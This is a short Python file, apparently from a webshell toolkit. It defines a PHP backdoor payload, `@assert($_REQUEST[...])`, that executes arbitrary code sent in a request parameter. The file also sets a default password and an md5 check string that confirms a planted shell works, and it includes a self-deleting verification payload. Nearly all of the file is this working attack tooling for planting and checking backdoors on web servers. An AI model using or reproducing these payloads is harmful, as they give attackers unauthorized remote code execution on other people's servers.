#author: fyth


from webshell import *


class PhpShell(Webshell):
    _password = 'cmd'
    _content = "<?php @assert($_REQUEST['{pwd}']);?>"
    _check_statement = 'var_dump(md5(123));'
    _keyword = '202cb962ac59075b964b07152d234b70'


class PhpVerify(VerifyShell):
    _content = "<?php var_dump(md5(123));unlink(__FILE__);?>"
    _keyword = '202cb962ac59075b964b07152d234b70'

